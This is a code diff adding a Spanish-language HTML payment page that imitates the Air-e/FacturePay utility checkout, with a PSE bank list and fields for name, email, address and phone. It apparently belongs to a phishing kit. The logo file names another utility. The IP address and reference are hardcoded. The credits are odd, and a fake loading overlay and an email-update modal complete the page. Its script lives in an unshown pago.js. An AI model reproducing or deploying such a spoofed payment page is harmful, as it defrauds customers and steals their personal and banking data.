@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proceso de Pago - FacturePay</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="css/pago.css">
+</head>
+<body>
+
+<header class="site-header">
+    <div class="header-logos">
+        <img src="img/logo-afinia-512x512-FavIcon_Mesa-de-trabajo-1-2.png" alt="Air-e" class="logo-aire">
+        <div class="header-divider"></div>
+        <img src="img/logo-pol-facture.png" alt="FacturePay" class="logo-facture">
+    </div>
+</header>
+
+    <div class="container">
+        <h2 class="page-title">Proceso de pago</h2>
+
+        <div class="content-wrapper">
+            
+            <div class="left-panel">
+                
+                <div class="info-table-container">
+                    <div class="table-header">
+                        <i class="fas fa-list-alt"></i> Información de pago
+                    </div>
+                    <table class="data-table">
+                        <tr>
+                            <td class="label-col">Nombre</td>
+                            <td class="value-col" id="lblNombre">Cargando...</td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Identificación</td>
+                            <td class="value-col" id="lblId">Cargando...</td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Usuario</td>
+                            <td class="value-col">****</td> 
+                        </tr>
+                        <tr>
+                            <td class="label-col">Dirección IP</td>
+                            <td class="value-col" id="lblIp">171.21.19.101</td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Referencia</td>
+                            <td class="value-col" id="lblRef">1701556720</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="info-table-container">
+                    <table class="concepts-table">
+                        <thead>
+                            <tr>
+                                <th>Concepto</th>
+                                <th>Valor neto</th>
+                                <th>IVA</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Pago documento 145640615</td>
+                                <td id="lblValorNeto">$0.00</td>
+                                <td>$0.00</td>
+                            </tr>
+                            <tr class="row-total">
+                                <td>Total</td>
+                                <td id="lblValorTotal" style="font-style: italic;">$0.00</td>
+                                <td>$0.00</td>
+                            </tr>
+                            <tr>
+                                <td colspan="3" style="text-align: right; padding-top: 15px; font-weight: 700;">
+                                    Total a pagar &nbsp;&nbsp;&nbsp; <span id="lblTotalFinal" style="font-size: 16px;">$0.00</span>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+            </div>
+
+            <div class="right-panel">
+                <h3 class="section-title">Medios de pago</h3>
+
+                <div class="payment-method-select">
+                    <input type="radio" checked class="radio-custom">
+                    <img src="img/LogoPSE.png" alt="">
+                    <span class="pse-text">PSE</span>
+                </div>
+
+                <form>
+                    <div class="form-group">
+                        <label class="form-label">Bancos *</label>
+                        <select class="form-control-line" id="selectBanco">
+                            <option>A continuación seleccione su banco *</option>
+                            <option value="" disabled selected>Seleccione una opción</option>
+                            <option>BANCOLOMBIA</option>
+                            <option>NEQUI</option>
+                            <option>BANCO DE BOGOTA</option>
+                            <option>BANCO BBVA COLOMBIA S.A</option>
+                            <option>DAVIbank S.A.</option>
+                            <option>BANCO DE OCCIDENTE</option>
+                            <option>BANCO CAJA SOCIAL</option>
+                            <option>BANCO AV VILLAS</option>
+                            <option>NU</option>
+                            <option>LULO BANK</option>
+                            <option>RAPPIPAY</option>
+                            <option>ALIANZA FIDUCIARIA</option>
+                            <option>BANCAMIA S.A.</option>
+                            <option>BANCO AGRARIO</option>
+                            <option>BANCO COOPERATIVO COOPCENTRAL</option>
+                            <option>BANCO CREDIFINANCIERA</option>
+                            <option>BANCO FALABELLA</option>
+                            <option>BANCO FINANDINA S.A. BIC</option>
+                            <option>BANCO GNB SUDAMERIS</option>
+                            <option>BANCO ITAU</option>
+                            <option>BANCO MUNDO MUJER S.A.</option>
+                            <option>BANCO PICHINCHA S.A.</option>
+                            <option>BANCO POPULAR</option>
+                            <option>BANCO PROCREDIT</option>
+                            <option>BANCO SANTANDER COLOMBIA</option>
+                            <option>BANCO SERFINANZA</option>
+                            <option>BANCO UNION antes GIROS</option>
+                            <option>BANCOOMEVA S.A.</option>
+                            <option>CFA COOPERATIVA FINANCIERA</option>
+                            <option>CITIBANK</option>
+                            <option>COLTEFINANCIERA</option>
+                            <option>CONFIAR COOPERATIVA FINANCIERA</option>
+                            <option>COOFINEP COOPERATIVA FINANCIERA</option>
+                            <option>COTRAFA</option>
+                            <option>CREZCAMOS S.A. COMPAÑÍA DE FINANCIAMIENTO</option>
+                            <option>DALE</option>
+                            <option>IRIS</option>
+                            <option>JFK COOPERATIVA FINANCIERA</option>
+                            <option>JP MORGAN</option>
+                            <option>MOVII S.A.</option>
+                            <option>UALÁ</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Tipo de persona *</label>
+                        <select class="form-control-line" id="formTipoPersona">
+                            <option>Natural</option>
+                            <option>Jurídica</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Nombre *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese nombre." id="formNombre">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Correo electrónico *</label>
+                        <input type="email" class="form-control-line" placeholder="Ingrese su correo electrónico" id="formCorreo">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Dirección *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese dirección." id="formDireccion">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Teléfono/celular *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese teléfono/celular" id="formCelular">
+                    </div>
+
+                    <div class="actions-container">
+                        <button type="button" class="btn-action btn-pay">Iniciar Pago</button>
+                        <button type="button" class="btn-action btn-cancel">Cancelar Pago</button>
+                    </div>
+                </form>
+
+            </div>
+        </div>
+
+        <div class="footer-strip">
+            <p class="footer-note">
+                Al presionar el botón <strong>Iniciar Pago</strong> acepta nuestra <a href="#">Política de Protección de Datos y Privacidad.</a><br>
+                <strong>Nota:</strong> El sistema se conectará con la página transaccional del Banco seleccionado. Una vez concluya el proceso de pago, no olvide regresar a nuestro sitio para obtener su comprobante.
+            </p>
+            
+            <div class="security-badges">
+                <div style="background:#00abc8; color:white; padding:5px; font-size:10px; display:flex; align-items:center; gap:5px;">
+                    <i class="fas fa-shield-alt"></i> TIPS DE SEGURIDAD
+                </div>
+                <div style="background:#00abc8; color:white; padding:5px; font-size:10px; display:flex; align-items:center; gap:5px;">
+                    <i class="fas fa-network-wired"></i> PROCEDIMIENTO DE PAGO FACTUREPAY
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        AIR-E S.A.S ESP - © 2025 Facture SAS By Estela
+    </div>
+
+    <div id="modalCorreo" class="custom-modal-overlay">
+        <div class="custom-modal-box">
+            <span class="modal-title">Actualizar Correo Electrónico</span>
+            
+            <div class="form-group">
+                <label class="form-label">Nuevo Correo *</label>
+                <input type="email" id="inputNuevoCorreo" class="form-control-line" placeholder="ejemplo@correo.com">
+            </div>
+
+            <div class="modal-btns">
+                <button id="btnCancelarModal" class="btn-modal-cancel">Cancelar</button>
+                <button id="btnGuardarModal" class="btn-modal-save">Actualizar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-screen">
+        <div class="spinner"></div>
+        <div id="dynamicLoadingText" class="loading-text">Conectando con la pasarela de pagos...</div>
+    </div>
+
+    <script src="js/pago.js"></script>
+</body>
+</html>
